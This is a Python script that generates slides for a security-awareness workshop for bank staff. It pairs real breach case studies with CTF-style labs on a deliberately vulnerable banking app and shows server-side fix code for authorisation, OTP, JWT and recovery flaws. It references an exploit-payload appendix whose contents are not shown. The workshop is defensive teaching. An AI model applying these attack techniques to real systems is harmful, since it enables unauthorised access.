 [('~25','organisations breached'),('Government','mailboxes accessed'),('1','signing key'),('&ldquo;Preventable&rdquo;','the review board&rsquo;s verdict')],
 'what would it cost us if one signing key leaked &mdash; can we revoke it, do we rotate it, and would we even detect tokens we never issued?',
 ('Closer to home &mdash; WazirX, 2024',
  'Attackers subverted the multi-signature approval process at the Indian crypto exchange. Once the signing step was compromised, the fraudulent transfer looked <em>authorised</em> to every downstream check. Roughly <strong>$234 million</strong> (about &#8377;2,000 crore) left in a single incident.',
  'yellow-left'))

RW_L1 = realworld(
 'ICICI Bank, 2024 &mdash; 17,000 credit cards shown to the wrong people',
 'A fault in the bank&rsquo;s digital channels mapped newly issued credit cards to the <strong>wrong customers&rsquo; accounts</strong>. Customers opening the app found somebody else&rsquo;s card &mdash; number, expiry and CVV &mdash; presented to them as their own. No attacker was required: the authorisation logic simply bound the wrong record to the wrong identity. The bank blocked the affected cards.',
 [('~17,000','credit cards exposed'),('CVV','and full card number visible'),('0','hacking involved'),('India','major private bank')],
 'when our application decides <em>whose</em> record to show, is that decision made on the server from the session &mdash; or from something the client supplied?',
 ('The same flaw, at scale &mdash; First American Financial, US',
  'A sequential number in a document URL exposed <strong>885 million</strong> files &mdash; bank account numbers, identity documents, mortgage and tax records going back to 2003 &mdash; with <strong>no login required</strong>. Regulators penalised the company; the technique required no skill at all.',
  'red-left'))

RW_G2 = realworld(
 'MOVEit, 2023 &mdash; one SQL injection, thousands of victims',
 'MOVEit Transfer is a trusted file-transfer product used by banks, governments, airlines and health systems. A single SQL injection flaw in it was exploited at scale by an extortion group. The organisations breached had done nothing wrong in their own code &mdash; they had simply bought and trusted the same product.',
 [('2,770+','organisations breached'),('95M+','individuals affected'),('1','flaw, in 1 product'),('&gt;$12B','estimated cumulative cost')],
 'which externally exposed third-party products hold our sensitive data &mdash; and how fast could we answer that question when tomorrow&rsquo;s advisory lands?',
 ('Closer to home &mdash; India, October 2023',
  'A listing appeared offering the personal data of roughly <strong>815 million Indians</strong> &mdash; including identity and passport details &mdash; reportedly drawn from a national health research database. Investigated by CERT-In, it is among the largest exposures of personal data ever reported anywhere.',
  'red-left'))

RW_G4 = realworld(
 'Polyfill.io, 2024 &mdash; 100,000 websites, one borrowed script',
 'Hundreds of thousands of sites loaded a convenience script from polyfill.io. The domain changed hands, and the script began serving <strong>malicious JavaScript</strong> to real visitors &mdash; redirecting mobile users to scam and betting sites. Every affected site kept its correct domain, its branding and a valid certificate. Nothing on the page looked wrong.',
 [('100,000+','websites affected'),('1','third-party script'),('Valid','certificate throughout'),('Mobile','users targeted first')],
 'do we have an inventory of every third-party script running on our customer-facing pages &mdash; and who is accountable when one of them changes owner?',
 ('What the regulator charged &mdash; British Airways',
  'A near-identical technique &mdash; injected JavaScript skimming the payment page for 15 days, around <strong>429,000 customers</strong> &mdash; drew a proposed <strong>&pound;183 million</strong> penalty, finally settled at <strong>&pound;20 million</strong>. Client-side code is in regulatory scope.',
  'yellow-left'))

RW_G9 = realworld(
 'Ivanti, 2024 &mdash; command injection, and a 48-hour evacuation order',
 'Two flaws in Ivanti&rsquo;s remote-access appliances &mdash; an authentication bypass chained with a <strong>command injection</strong> &mdash; gave unauthenticated attackers the ability to run commands on the device protecting the network. US authorities issued a rare emergency directive ordering federal agencies to <strong>disconnect the appliances within 48 hours</strong>. Exactly the chaining pattern we will look at next.',
 [('48 hours','to disconnect, by order'),('2','flaws chained into 1 takeover'),('Thousands','of appliances worldwide'),('VPN','the device was the security control')],
 'if we were told tonight to disconnect a core security appliance within 48 hours, could we &mdash; and what would stop working?',
 ('What it costs when the patch waits &mdash; Equifax',
  'The same bug class, left unpatched for two months on an internet-facing server: <strong>147.9 million</strong> people&rsquo;s records, <strong>76 days</strong> of undetected access, <strong>$700M+</strong> in settlements, and the exit of the chief executive, CIO and security chief.',
  'red-left'))

# ================= v2: MISSING SLIDES FOR BLOCK CONSISTENCY ==================
G9_MOMENT = '''<section class="slide"><div class="slide-inner center">
<h1 style="color:var(--red);font-size:clamp(1.5rem,2.9vw,2.3rem)">We asked the bank for a PDF.<br/>It handed us the server.</h1>
<div class="sep" style="max-width:200px;margin:2rem auto"></div>
<p class="big" style="color:var(--t2)">Every other attack today stayed inside the application.<br/>This one stepped outside it &mdash; onto the operating system the application runs on.</p>
<p class="mt3 desc">From here an attacker reads files, reaches other systems on the network,<br/>installs persistence, and deletes the logs that would have shown any of it.</p>
</div></section>'''

L11_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; Keep the Secret on the Server</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// The browser must never receive the OTP,</span>
<span class="cm">// nor anything it can be derived from.</span>
<span class="var">$otp</span> = <span class="fn">random_int</span>(<span class="num">100000</span>, <span class="num">999999</span>);
<span class="var">$_SESSION</span>[<span class="str">'otp_hash'</span>] = <span class="fn">password_hash</span>(<span class="var">$otp</span>, <span class="var">PASSWORD_DEFAULT</span>);
<span class="var">$_SESSION</span>[<span class="str">'otp_expires'</span>] = <span class="fn">time</span>() + <span class="num">300</span>;

<span class="fn">sendSms</span>(<span class="var">$user</span>[<span class="str">'mobile'</span>], <span class="var">$otp</span>);  <span class="cm">// out-of-band only</span>

<span class="cm">// On submit — compared server-side:</span>
<span class="kw">if</span> (!<span class="fn">password_verify</span>(<span class="var">$input</span>, <span class="var">$_SESSION</span>[<span class="fix-hl">'otp_hash'</span>])) {
    <span class="fn">recordFailedAttempt</span>();  <span class="cm">// + lockout after 5</span>
}</code></pre>
</div>
<div>
<p class="sub mb1">Why this works</p>
<div class="card green-left">
<p class="desc"><strong style="color:var(--green)">The second factor must travel a second channel.</strong> If the code arrives in the same response as the page asking for it, it is not a second factor &mdash; it is a formality.</p>
<p class="desc mt1"><strong style="color:var(--green)">Verify server-side.</strong> The browser&rsquo;s job is to collect the input, never to judge it.</p>
<p class="desc mt1"><strong style="color:var(--green)">Bound attempts and lifetime.</strong> A six-digit code with unlimited attempts is a four-minute brute force.</p>
</div>
<p class="desc mt2" style="font-size:.86rem;color:var(--t3)">Rule of thumb: open your own site, press Ctrl+U and Ctrl+Shift+I. Anything you can find there, an attacker already has.</p>
</div>
</div>
</div></section>'''

L1_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; Five Words in the Query</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// Never trust the account id that was submitted.</span>
<span class="cm">// Prove it belongs to the logged-in user.</span>
<span class="var">$stmt</span> = <span class="var">$pdo</span>-&gt;<span class="fn">prepare</span>(
  <span class="str">'SELECT id, balance
     FROM accounts
    WHERE id = :acct
      <span class="fix-hl">AND user_id = :uid</span>'</span>
);
<span class="var">$stmt</span>-&gt;<span class="fn">execute</span>([
  <span class="str">':acct'</span> =&gt; <span class="var">$fromAccount</span>,
  <span class="str">':uid'</span>  =&gt; <span class="var">$_SESSION</span>[<span class="str">'uid'</span>]   <span class="cm">// from the session, not the form</span>
]);

<span class="kw">if</span> (!<span class="var">$stmt</span>-&gt;<span class="fn">fetch</span>()) { <span class="fn">deny</span>(); }</code></pre>
</div>
<div>
<p class="sub mb1">Why this works</p>
<div class="card green-left">
<p class="desc"><strong style="color:var(--green)">The identity comes from the session.</strong> The session is the one thing the user cannot edit. Everything else in the request is a suggestion.</p>
<p class="desc mt1"><strong style="color:var(--green)">Authorisation lives in the query.</strong> Not in the dropdown, not in a hidden field, not in the JavaScript &mdash; in the database call that actually moves the money.</p>
<p class="desc mt1"><strong style="color:var(--green)">Deny by default.</strong> If the row does not come back, the account was not theirs. Stop.</p>
</div>
<p class="desc mt2" style="font-size:.86rem;color:var(--t3)">This pattern has to be repeated on every single endpoint that touches customer data. Missing it once is enough.</p>
</div>
</div>
</div></section>'''

# ---- "Who Should Have Caught This?" — one per vulnerability ----
WHO_L11 = whocaught([
 ('Application Security', [
  '<strong>Nothing sensitive goes to the client.</strong> Secrets, internal identifiers, debug objects and verification values must never be serialised into a page or an API response &ldquo;because the front end needs it.&rdquo;',
  '<strong>Review the response, not just the request.</strong> Most review effort goes into validating what comes in. This class of flaw is entirely about what goes out.']),
 ('Penetration Testing', [
  '<strong>Automated scanners rarely catch this.</strong> The page works perfectly and returns HTTP 200. Finding it requires a human reading the response and asking &ldquo;why is this here?&rdquo;'])],
 '&ldquo;What does our application send to the browser that it does not actually need to?&rdquo;')

WHO_L25 = whocaught([
 ('Identity &amp; Access Management', [
  '<strong>IAM owns the definition of &ldquo;verified.&rdquo;</strong> Each identity check must be bound to the <em>exact</em> account it was performed for &mdash; not to whoever happens to be in the session.',
  '<strong>Progress belongs to a subject.</strong> Clearing a recovery step for one account must never count as clearing it for another.']),
 ('Penetration Testing', [
  '<strong>Static analysis cannot see this.</strong> The code is syntactically perfect &mdash; the flaw is in the <em>sequence</em>. Only someone deliberately taking steps out of order, across accounts, will find it.'])],
 '&ldquo;Which of our checks prove who you are, and which only prove that someone started a recovery?&rdquo;')

WHO_L12 = whocaught([
 ('Application Security', [
  '<strong>Dependency defaults are design decisions.</strong> &ldquo;We used the standard library&rdquo; is not the same as &ldquo;we configured it safely.&rdquo; Someone must own that choice and be able to justify it.',
  '<strong>Pin the algorithm, verify every claim.</strong> Expiry, issuer and audience are not optional extras.']),
 ('Identity &amp; Access Management', [
  '<strong>Anything carrying role or entitlement is a crown-jewel asset.</strong> It must be signed, short-lived, revocable, and validated server-side on every request &mdash; never trusted because it arrived in a cookie.'])],
 '&ldquo;Where in our stack does a user-supplied token decide what that user is allowed to do?&rdquo;')

WHO_L1 = whocaught([
 ('Identity &amp; Access Management', [
  '<strong>IAM designs the authorisation model</strong> &mdash; who may act on which record. If that model only exists in a document, it does not exist.',
  '<strong>Authentication is not authorisation.</strong> Logging someone in says who they are. It says nothing about whose account they may touch.']),
 ('Application Security &amp; Penetration Testing', [
  '<strong>This is the single most common serious finding in banking applications</strong>, and the hardest to automate. A scanner does not know that account 4471 should not belong to this customer &mdash; only a tester with two accounts does.'])],
 '&ldquo;Do we test every endpoint with two different customers, or only with one?&rdquo;')

WHO_G2 = whocaught([
 ('Application Security', [
  '<strong>The same rule as G1, applied everywhere.</strong> One parameterised login does not help if the search, the report and the export still concatenate. Coverage is the control, not the pattern.']),
 ('Cyber Operations / SOC', [
  '<strong>This is where detection earns its budget.</strong> One session reading 48,000 rows is an anomaly that should page a human. When prevention fails, this is the difference between an incident and a breach notification.']),
 ('Infrastructure &amp; Data', [
  '<strong>Least privilege on the database.</strong> If the web application&rsquo;s database account cannot read the credentials table, a successful injection returns nothing worth stealing.'])],
 '&ldquo;Would we notice a single account reading our entire customer table &mdash; and in what timeframe?&rdquo;')

WHO_G4 = whocaught([
 ('Application Security', [
  '<strong>Encode on output, everywhere.</strong> One missed echo on one page out of four hundred is enough, which is why this needs to be a framework default rather than developer discipline.',
  '<strong>Content Security Policy and HttpOnly cookies</strong> are what save you on the day the encoding is missed.']),
 ('Third-Party &amp; Supply Chain', [
  '<strong>Every third-party script is code you ship but do not control.</strong> Someone must own the inventory, pin the versions, and know what happens when a vendor changes hands.'])],
 '&ldquo;Who owns the list of JavaScript running on our customer-facing pages &mdash; and when was it last reviewed?&rdquo;')

# ---- Fix slides slimmed (org tie-in now lives on its own slide) ----
L25_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; Bind Progress to the Target</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// Step 1 — a new target restarts the journey:</span>
<span class="var">$_SESSION</span>[<span class="str">'recovery_stage'</span>]     = <span class="num">0</span>;
<span class="var">$_SESSION</span>[<span class="str">'recovery_stage_uid'</span>] = <span class="num">0</span>;

<span class="cm">// Step 4 — the gate binds progress to the target:</span>
<span class="var">$gateOpen</span> =
    <span class="var">$recoveryStage</span> &gt;= <span class="num">2</span>
    <span class="fix-hl">&amp;&amp; <span class="var">$stageUid</span> === <span class="var">$recoveryUid</span></span>;  <span class="cm">// same account</span></code></pre>
</div>
<div>
<p class="sub mb1">Why this works</p>
<div class="card green-left">
<p class="desc"><strong style="color:var(--green)">Progress belongs to an account.</strong> <code>recovery_stage_uid</code> records <em>which</em> account earned the checks; the reset refuses to run for any other.</p>
<p class="desc mt1"><strong style="color:var(--green)">Changing the target starts over.</strong> Submitting a different Customer ID clears the stage &mdash; a swapped-in victim arrives with nothing earned.</p>
<p class="desc mt1"><strong style="color:var(--green)">One account, start to finish.</strong> The identity checks and the reset must all be for the same person.</p>
</div>
<p class="desc mt2" style="font-size:.86rem;color:var(--t3)">Note what the fix is <em>not</em>: it is not more code. It is one equality check added and one state reset on a target change.</p>
</div>
</div>
</div></section>'''

L12_FIX = '''<section class="slide"><div class="slide-inner">
<h3 class="mb1">The Fix &mdash; The Server Decides</h3>
<div class="grid2 gap2">
<div>
<pre><code><span class="cm">// Never read the algorithm from the token.</span>
<span class="var">$decoded</span> = <span class="var">JWT</span>::<span class="fn">decode</span>(
    <span class="var">$token</span>,
    <span class="kw">new</span> <span class="fn">Key</span>(<span class="var">$secret</span>, <span class="fix-hl"><span class="str">'HS256'</span></span>)   <span class="cm">// pinned</span>
);

<span class="cm">// Then verify the claims, every request:</span>
<span class="fn">assertNotExpired</span>(<span class="var">$decoded</span>-&gt;exp);
<span class="fn">assertIssuer</span>(<span class="var">$decoded</span>-&gt;iss);
<span class="fn">assertAudience</span>(<span class="var">$decoded</span>-&gt;aud);

<span class="cm">// Role comes from the database, not the token.</span></code></pre>
</div>
<div>
<p class="sub mb1">Why this works</p>
<div class="card green-left">
<p class="desc"><strong style="color:var(--green)">The attacker no longer chooses the verification method.</strong> The server names one algorithm and rejects everything else.</p>
<p class="desc mt1"><strong style="color:var(--green)">Short lifetimes limit the damage</strong> of any token that does leak, and give you a revocation window.</p>
<p class="desc mt1"><strong style="color:var(--green)">Treat the role claim as a hint, not an authority.</strong> Look up what this user may do, server-side, rather than believing what they handed you.</p>
</div>
<p class="desc mt2" style="font-size:.86rem;color:var(--t3)">One configuration line. The library supported it the whole time &mdash; the default was simply permissive.</p>
</div>
</div>
</div></section>'''


# ================= v3: ORIENTATION SLIDES ====================================
S_ROADMAP = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">The shape of today</p>
<h2 class="mb2">What the next 90 minutes look like</h2>
<div class="flow">
<div class="flow-step"><strong>1. A real bank</strong><p class="desc mt1" style="font-size:.8rem">A working banking application &mdash; not slides about one</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>2. Walk the app</strong><p class="desc mt1" style="font-size:.8rem">Log in, move money, pull statements &mdash; as a customer</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>3. Break it, 8 times</strong><p class="desc mt1" style="font-size:.8rem">Each vulnerability demonstrated, then handed to you</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>4. Chain it</strong><p class="desc mt1" style="font-size:.8rem">Eight findings become one full compromise</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>5. AI</strong><p class="desc mt1" style="font-size:.8rem">What changed on offence and on defence</p></div>
<div class="flow-arrow">&rarr;</div>
<div class="flow-step"><strong>6. Questions</strong><p class="desc mt1" style="font-size:.8rem">What you ask your teams on Monday</p></div>
</div>
<p class="sub mt3 mb1">And for every one of the eight, the same five beats</p>
<div class="chain beats">
<div class="chain-step" style="border-left-color:var(--green)"><div class="cs-id">BEAT 1</div><div class="cs-t">I demonstrate</div><div class="cs-d">Level 0, training mode. You follow along on your own screen. No flag.</div></div>
<div class="chain-step" style="border-left-color:var(--amber)"><div class="cs-id">BEAT 2</div><div class="cs-t">You exploit it</div><div class="cs-d">I raise the level. You solve it yourself against a five-minute clock.</div></div>
<div class="chain-step" style="border-left-color:var(--amber)"><div class="cs-id">BEAT 3</div><div class="cs-t">Capture &amp; score</div><div class="cs-d">The app gives you a flag. Submit it. Points go on the leaderboard.</div></div>
<div class="chain-step" style="border-left-color:var(--indigo)"><div class="cs-id">BEAT 4</div><div class="cs-t">Who should have caught it</div><div class="cs-d">Which function &mdash; AppSec, IAM, SOC, Pen Test &mdash; owns preventing this.</div></div>
<div class="chain-step" style="border-left-color:var(--red)"><div class="cs-id">BEAT 5</div><div class="cs-t">Who it happened to</div><div class="cs-d">A real organisation, a real cost, and the question it should raise for us.</div></div>
</div>
</div></section>'''

S_HOWWEWORK = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">Ground rules</p>
<h2 class="mb2">How we will work</h2>
<div class="grid3" style="gap:1rem">
<div class="card green-left"><h3 style="font-size:1.02rem">&#128187; Nothing to install</h3><p class="desc mt1" style="font-size:.88rem">A browser and its built-in developer tools. That is the entire toolkit. Every lab is deliberately designed to be solvable that way &mdash; no Kali, no Burp, no command line.</p></div>
<div class="card accent-left"><h3 style="font-size:1.02rem">&#127919; Two modes, one app</h3><p class="desc mt1" style="font-size:.88rem"><strong style="color:var(--t1)">Training mode</strong> &mdash; guided, hints available, nothing scored. <strong style="color:var(--t1)">CTF mode</strong> &mdash; the same flaw, harder, and it issues a flag worth points. I switch modes live from an instructor panel.</p></div>
<div class="card yellow-left"><h3 style="font-size:1.02rem">&#128202; Four difficulty levels</h3><p class="desc mt1" style="font-size:.88rem"><strong>L0</strong> wide open (my demo) &rarr; <strong>L1</strong> weak filter &rarr; <strong>L2</strong> partial defence, different technique needed &rarr; <strong>L3</strong> properly fixed. You will work at L1 or L2.</p></div>
<div class="card accent-left"><h3 style="font-size:1.02rem">&#128273; Your own account</h3><p class="desc mt1" style="font-size:.88rem">Each of you logs in as a different customer, and each flag is unique to you &mdash; so a flag cannot be passed to the person beside you. Work together on the <em>method</em>, not the answer.</p></div>
<div class="card green-left"><h3 style="font-size:1.02rem">&#127942; Leaderboard</h3><p class="desc mt1" style="font-size:.88rem">Submit a flag and your score updates live. It is there for momentum, not judgement &mdash; nobody is expected to solve all of them.</p></div>
<div class="card red-left"><h3 style="font-size:1.02rem">&#9888; Safe by design</h3><p class="desc mt1" style="font-size:.88rem">Isolated lab. Fake customers, fake money, fake credentials. Nothing you type can reach a real system &mdash; so try things. Breaking it is the point.</p></div>
</div>
<p class="big center mt3">Ask questions the moment something does not make sense.<br/>If one of you is lost, several others are too.</p>
</div></section>'''


# ================= v4: REWRITTEN MINDSET SLIDE + FEEDBACK ====================
S_MINDSET = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">The security mindset</p>
<h2 class="mb1">The same feature, read two ways</h2>
<div class="card accent-left mb2" style="padding:.7rem 1rem">
<p class="desc" style="font-size:.9rem"><strong style="color:var(--t1)">The price travelled in the receipt.</strong> An online shop put each item&rsquo;s price in a hidden field on the page, so it could show you your total &mdash; sensible, and every developer who built it was right. Then someone opened the request, changed <code>price: 4999</code> to <code>price: 1</code>, and bought a laptop for a pound. Nobody broke in. The shop was simply <strong style="color:var(--red)">trusting the shopper to report the price honestly.</strong></p>
</div>
<p class="big center mb2" style="font-size:clamp(.95rem,1.5vw,1.15rem);color:var(--t2)">Nothing there was a mistake &mdash; the vulnerability was a piece of trust nobody noticed they had placed.</p>
<p class="desc mb1">A developer hears a reasonable sentence. An attacker hears the same sentence and asks a different question:</p>
<table class="mt1" id="mindset-table">
<thead><tr><th style="width:46%">What you will hear in the room</th><th class="atk-col" style="opacity:0;transition:opacity .5s">What an attacker hears</th></tr></thead>
<tbody>
<tr><td><em>&ldquo;That field is read-only in the interface.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Read-only in your browser. I am not using your browser.&rdquo;</em></td></tr>
<tr><td><em>&ldquo;Only logged-in users can reach that page.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Logged in as whom &mdash; and entitled to see whose data?&rdquo;</em></td></tr>
<tr><td><em>&ldquo;That library is standard &mdash; everyone uses it.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;Including me. I know its default settings better than your team does.&rdquo;</em></td></tr>
<tr><td><em>&ldquo;We have never had a problem with it.&rdquo;</em></td><td class="atk-col" style="opacity:0;transition:opacity .5s;color:var(--red)"><em>&ldquo;That you know of. Nothing here is watching.&rdquo;</em></td></tr>
</tbody>
</table>
<div class="mt2 center">
<p class="big" id="mindset-pre" style="font-size:clamp(1rem,1.6vw,1.2rem);color:var(--t2)">Read those again. Not one of them is wrong, lazy, or unreasonable.</p>
<button class="timer-btn mt1" id="mindset-reveal-btn" onclick="revealAttacker()" style="margin-top:.8rem">&#128269; Now hear the other half of the sentence</button>
<p class="big" id="mindset-post" style="font-size:clamp(1rem,1.6vw,1.2rem);display:none">Every one of them is <strong>true</strong> &mdash; and every one is doing the job of a security control without being one.<br/>You do not need to know the answer. You need to notice when a sentence is being used as a safeguard.</p>
</div>
</div></section>'''


# =============================== ASSEMBLY ====================================
# ===================== Deep-Dive appendix (explanation & solutions) ===========
# Reuses the single shared source of truth in sol_data.py (same content as
# VULN_SOLUTIONS.html), re-styled with this deck's own CSS vocabulary.
import html as _h
from sol_data import VULNS as _SOLV

def _sol_code(raw):
    esc = _h.escape(raw, quote=False)
    esc = esc.replace('&lt;INJ&gt;', '<span class="inj">').replace('&lt;RST&gt;', '</span>')
    esc = esc.replace('&lt;COMMENT&gt;', '<span class="cmt">').replace('&lt;/COMMENT&gt;', '</span>')
    return '<pre class="sol-code">%s</pre>' % esc

def _sol_overview(v):
    lad = ''.join('<div class="sol-lrow"><span class="sol-lk">%s</span><span class="sol-lv">%s</span></div>' % (k, t)
                  for k, t in v['ladder'])
    note = '<div class="sol-note"><strong>Note.</strong> %s</div>' % v['note'] if v.get('note') else ''
    return ('<section class="slide"><div class="slide-inner">'
      '<div class="sol-head"><span class="sol-tag">%s</span><div>'
      '<div class="sol-cwe">%s</div><h2 style="margin:.06em 0">%s</h2>'
      '<div class="sol-where">&#128205; %s</div></div></div>'
      '<div class="grid2 mt2"><div>'
      '<p class="sub mb1">Goal</p><p class="desc">%s</p>'
      '<p class="sub mb1 mt3">Root cause</p><p class="desc">%s</p>%s</div>'
      '<div><p class="sub mb1">Level ladder</p><div class="sol-ladder">%s</div>'
      '<div class="card green-left mt3"><p class="desc" style="font-size:1rem">%s</p></div>'
      '</div></div></div></section>') % (
      v['tag'], v['cwe'], v['title'], v['where'], v['goal'], v['root'], note, lad, v['fix'])

def _sol_level(v, Lv):
    cls = 'l0' if 'L0' in Lv['lvl'] else ('l1' if Lv['lvl'].startswith('L1') else 'l2')
    sql = _sol_code(Lv['sql']) if Lv.get('sql') else ''
    lesson = '<div class="sol-lesson">&#128161; %s</div>' % Lv['lesson'] if Lv.get('lesson') else ''
    return ('<section class="slide"><div class="slide-inner">'
      '<div class="sol-head"><span class="sol-tag">%s</span>'
      '<h2 class="sol-lvlbadge %s" style="margin:0">%s &mdash; %s</h2>'
      '<span class="sol-where" style="margin-left:auto">%s</span></div>'
      '<div class="grid2 mt2"><div><p class="sub mb1">The mitigation at this level</p><p class="desc">%s</p></div>'
      '<div><p class="sub mb1">How to solve it</p><p class="desc">%s</p></div></div>'
      '%s'
      '<p class="sub mb1 mt3">Payload</p><div class="sol-pay">%s</div>'
      '<div class="sol-paynote">%s</div>%s'
      '</div></section>') % (
      v['tag'], cls, Lv['lvl'], Lv['name'], v['title'],
      Lv['mit'], Lv['sol'], sql,
      _h.escape(Lv['payload'], quote=False), _h.escape(Lv['paynote'], quote=False), lesson)

# One solution block per vuln = overview + every level slide, keyed by tag so it
# can be dropped in right after that vuln's own "Your Turn" slide.
# L0_AS_DEMO: tags whose L0 is presented up front as the live demo, so L0 is NOT
# repeated in the debrief solution block (overview + L1 + L2 only). Every vuln's
# demo already walks through L0, so the debrief L0 recap was pure duplication.
L0_AS_DEMO = {'G1','L11','L25','L12','L1','G2','G4','G9'}
SOL_BY_TAG = {}
for _v in _SOLV:
    SOL_BY_TAG[_v['tag']] = [_sol_overview(_v)] + [
        _sol_level(_v, _Lv) for _Lv in _v['levels']
        if not (_v['tag'] in L0_AS_DEMO and 'L0' in _Lv['lvl'])]

# ===================== PHASE 2: framing, pauses & close ======================
S_INTRO = '''<section class="slide"><div class="slide-inner center">
<p class="sub mb1">Before we start</p>
<h2 class="mb2">Who is walking you through this</h2>
<div class="grid3 mt2" style="gap:1rem;text-align:left">
<div class="card accent-left"><h3 style="font-size:1rem">Who I am</h3><p class="desc mt1" style="font-size:.9rem">[Your name] &mdash; [role], [X] years in [offensive / defensive] security.</p></div>
<div class="card accent-left"><h3 style="font-size:1rem">What I have done</h3><p class="desc mt1" style="font-size:.9rem">[A credential or two the room will trust in one breath &mdash; engagements led, systems tested, breaches worked, certifications.]</p></div>
<div class="card accent-left"><h3 style="font-size:1rem">Why I am here today</h3><p class="desc mt1" style="font-size:.9rem">Not to make you security experts &mdash; to let you see, with your own eyes, what your teams are up against.</p></div>
</div>
<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem);color:var(--t2)">Everything you will see today, I have watched happen to a real organisation.</p>
</div></section>'''

S_WHY_HERE = '''<section class="slide"><div class="slide-inner center">
<p class="sub mb1">One question before we dive in</p>
<h1 class="gradient" style="font-size:clamp(1.6rem,3.2vw,2.4rem)">Why are you in this room?</h1>
<p class="big mt2">What is the one thing you want to walk out able to do &mdash;<br/>or able to <em>ask</em> &mdash; that you could not this morning?</p>
<div class="grid3 mt3" style="gap:.8rem;text-align:left">
<div class="card"><p class="desc" style="font-size:.88rem">Hold that thought. We come back to it at the very end and check whether we got you there.</p></div>
<div class="card"><p class="desc" style="font-size:.88rem">No wrong answers, no silly questions &mdash; if something is unclear, several others are wondering too.</p></div>
<div class="card"><p class="desc" style="font-size:.88rem">Say it out loud if you are comfortable &mdash; it tells me where to put the emphasis today.</p></div>
</div>
</div></section>'''

S_OPENING_INCIDENT = '''<section class="slide"><div class="slide-inner">
<p class="sub mb1">December 2021 &bull; a true story</p>
<h2 class="mb2">It started with one line in a log file</h2>
<div class="grid2 gap2">
<div>
<div class="card red-left mb2"><p class="desc"><strong style="color:var(--t1)">A single line of text</strong> &mdash; typed into a username box, a chat message, even a device name &mdash; could take over the server that merely wrote it to a log. No password. No warning.</p></div>
<div class="card accent-left"><p class="desc">The flaw lived in <strong style="color:var(--t1)">Log4j</strong>, a free logging tool buried inside tens of thousands of products. Most affected companies <strong style="color:var(--red)">did not know they were running it</strong> &mdash; it arrived inside something they had bought.</p></div>
</div>
<div>
<div class="card" style="text-align:center"><p class="sub mb1">Severity</p><p class="gradient" style="font-size:2.6rem;font-weight:800;line-height:1">10.0 / 10</p><p class="desc mt1" style="font-size:.82rem">the maximum score that exists &mdash; called by some &ldquo;the most serious vulnerability in a generation&rdquo;</p></div>
<div class="card mt2"><p class="desc" style="font-size:.9rem">Teams worked through the holidays to patch it. A year on, systems were <strong>still</strong> breached through it &mdash; because nobody had a full list of where it lived.</p></div>
</div>
</div>
<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem)">That gap is what today is about: the distance between <em>&ldquo;we are fine&rdquo;</em> and <em>&ldquo;we do not actually know.&rdquo;</em></p>
</div></section>'''

S_REFLECT1 = '''<section class="slide"><div class="slide-inner center">
<p class="sub mb1">Pause &mdash; before we connect the dots</p>
<h2 class="mb2">What did that stir up?</h2>
<div class="grid3 mt2" style="gap:1rem;text-align:left">
<div class="card accent-left"><h3 style="font-size:1rem">In your world</h3><p class="desc mt1" style="font-size:.9rem">Which of these eight felt closest to something in your own systems &mdash; a feature you would have signed off without a second thought?</p></div>
<div class="card accent-left"><h3 style="font-size:1rem">The sentence</h3><p class="desc mt1" style="font-size:.9rem">Where, in your last few meetings, did you hear a <em>reasonable</em> sentence quietly doing the job of a security control?</p></div>
<div class="card accent-left"><h3 style="font-size:1rem">The decision</h3><p class="desc mt1" style="font-size:.9rem">Think of a &ldquo;go live now, test later&rdquo; call you have made. Would you make it the same way after this?</p></div>
</div>
<p class="big center mt3" style="font-size:clamp(.95rem,1.5vw,1.15rem);color:var(--t2)">Take thirty seconds &mdash; turn to the person next to you. What is one example from your own world?</p>
</div></section>'''

S_CLOSE = '''<section class="slide"><div class="slide-inner center">
<p class="sub mb1">Where we leave it</p>
<h1 class="gradient" style="font-size:clamp(1.7rem,3.4vw,2.6rem)">You will not leave a penetration tester.</h1>
<p class="big mt2">You will leave able to tell the difference between<br/><em>&ldquo;we are secure&rdquo;</em> and <em>&ldquo;no one has checked.&rdquo;</em></p>
<div class="card accent-left mt3" style="text-align:left;max-width:760px;margin-left:auto;margin-right:auto">
<p class="desc"><strong style="color:var(--t1)">The one habit to keep:</strong> when someone tells you a system is safe, ask the quiet question &mdash; <em>&ldquo;safe because we checked, or safe because nothing has gone wrong yet?&rdquo;</em> Everything today was the second kind &mdash; right up until someone looked.</p>
</div>
<p class="big center mt3" style="font-size:clamp(1rem,1.6vw,1.2rem);color:var(--t2)">Now &mdash; the question you wrote down at the start. Did we get you there?</p>
</div></section>'''

# Each entry: ('orig', id, phase, kind) or ('new', html_string, phase, kind)
C='Context'; L='Live Labs'; CH='The Chain'; AI='AI'; TK='Takeaways'; DD='Deep-Dive'

# G1 Level-0 live demo, in the deep-dive (sol-) style, folding in the old plain
# "How Login Normally Works", "The Attack" and "The Vulnerable Code" slides.
G1_DEMO_L0 = '''<section class="slide"><div class="slide-inner">
<div class="sol-head"><span class="sol-tag">G1</span><div><div class="sol-cwe">CWE-89 &middot; A03:2021 &middot; Level 0 &mdash; live demo</div><h2 style="margin:.06em 0">SQL Injection &mdash; Login Bypass</h2><div class="sol-where">&#128205; /login &mdash; Customer ID box</div></div></div>
<div class="grid2 mt2">
<div>
<p class="sub mb1">How login normally works</p>
